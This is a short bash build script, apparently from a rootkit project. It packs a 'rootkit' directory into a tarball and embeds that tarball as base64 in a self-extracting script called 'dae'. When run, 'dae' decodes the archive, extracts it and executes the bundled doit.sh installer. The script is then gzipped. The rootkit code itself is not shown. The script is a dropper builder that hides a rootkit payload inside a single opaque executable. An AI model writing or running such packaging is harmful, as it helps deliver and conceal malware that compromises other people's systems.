#!/bin/bash

if [[ -f rk.tar.gz ]]; then
	rm rk.tar.gz
fi
cd ..
if [[ -f rk.tar.gz ]]; then
	rm rk.tar.gz
fi
if [[ -d rk ]]; then
	rm -rf rk
fi
mkdir rk
cp ./rootkit/* rk
tar cvzf ./rk.tar.gz ./rk
cp ./rk.tar.gz ./rootkit
cd ->/dev/null
if [[ -f dae ]]; then
	rm dae
fi
touch dae
chmod 00755 dae
chmod +rwx dae
echo -ne "#!/bin/bash\n\necho '" > dae
base64 rk.tar.gz -w0 >> dae
echo -ne "' | base64 -d > rk.tar.gz\n\n" >> dae
echo "tar xvf rk.tar.gz && chmod +x ./rk/doit.sh && ./rk/doit.sh" >> dae
echo "" >> dae
chmod +x dae
if [[ -f dae.gz ]]; then
	rm dae.gz
fi
gzip dae
